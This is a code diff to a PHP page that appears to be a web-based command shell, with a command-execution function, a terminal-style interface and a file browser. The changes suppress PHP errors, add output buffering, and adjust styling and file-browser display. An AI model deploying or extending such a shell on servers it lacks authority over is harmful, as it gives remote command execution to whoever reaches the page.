@@ -1,8 +1,12 @@
 <?php
+error_reporting(0);
+ini_set('display_errors', 0);
+ob_start();
+
 session_start();
 
 if (!isset($_SESSION['cwd'])) {
-    $_SESSION['cwd'] = getcwd();
+    $_SESSION['cwd'] = realpath(__DIR__);
 }
 
 function executeCommand($cmd) {
@@ -93,10 +97,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             break;
     }
 
+    ob_clean();
     header('Content-Type: application/json');
     echo json_encode($response);
+    ob_end_flush();
     exit;
 }
+ob_end_clean();
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -209,16 +216,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             color: #00ff41;
             font-weight: 600;
         }
-        .output-line.clickable {
-            cursor: pointer;
-            color: #4dabf7;
-            text-decoration: underline;
-            text-decoration-style: dotted;
-            transition: color 0.2s;
-        }
-        .output-line.clickable:hover {
-            color: #74c0fc;
-        }
         .input-line {
             display: flex;
             align-items: center;
@@ -291,14 +288,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             border-color: #ff6b6b;
             color: #ff6b6b;
         }
-        .btn.primary {
-            background: #1a3a2a;
-            border-color: #00ff41;
-            color: #00ff41;
-        }
-        .btn.primary:hover {
-            background: #1f4a2f;
-        }
         .btn-group {
             display: flex;
             gap: 6px;
@@ -312,6 +301,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             margin-bottom: 8px;
             max-height: 200px;
             overflow-y: auto;
+            display: none;
         }
         .file-browser::-webkit-scrollbar {
             width: 6px;
@@ -486,6 +476,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         const data = JSON.parse(text);
                         if (data.success && Array.isArray(data.data)) {
                             fileBrowser.innerHTML = '';
+                            fileBrowser.style.display = 'block';
                             data.data.forEach(item => {
                                 const div = document.createElement('div');
                                 div.className = 'file-item ' + item.type;
@@ -501,7 +492,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                                 }
                                 fileBrowser.appendChild(div);
                             });
-                            fileBrowser.style.display = 'block';
                         }
                     } catch (e) {
                         console.error('Failed to parse listing:', text.substring(0, 100));
